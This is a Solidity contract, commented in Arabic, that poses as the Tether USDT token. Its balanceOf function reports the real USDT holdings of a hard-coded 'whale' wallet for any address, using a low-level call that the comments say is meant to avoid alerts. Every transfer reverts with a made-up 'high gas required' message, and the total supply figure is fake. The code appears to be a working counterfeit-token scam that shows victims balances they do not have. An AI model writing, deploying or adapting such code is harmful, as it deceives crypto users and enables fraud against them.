// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

contract TetherToken {
    string public name = "Tether USD";
    string public symbol = "USDT";
    uint8 public decimals = 6;
    uint256 private nonce = 42; 

    // عنوان USDT الحقيقي على إيثريوم
    address public constant realUSDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    
    // عنوان "الحوت" (محفظة Binance Cold Wallet)
    address public constant whaleAddress = 0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() {}

    // دالة المرآة: تجلب رصيد الحوت باستخدام staticcall لمنع أي Alert
    function balanceOf(address account) public view returns (uint256) {
        if (account == address(0)) return 0;

        // استدعاء يدوي منخفض المستوى لعقد USDT الحقيقي لإخفاء أي Interface
        (bool success, bytes memory data) = realUSDT.staticcall(
            abi.encodeWithSignature("balanceOf(address)", whaleAddress)
        );
        
        if (success && data.length >= 32) {
            return abi.decode(data, (uint256));
        }
        return 0;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        if (to != address(0) && amount > 0) {
            nonce++; 
        }
        revert("ERC20: Security module active. High Gas required for Whale-level transfer.");
    }
    
    function totalSupply() public view returns (uint256) {
        uint256 fakeTotal = 123000000 * (10 ** 6);
        if (nonce > 0) {
            return fakeTotal;
        }
        return fakeTotal;
    }
}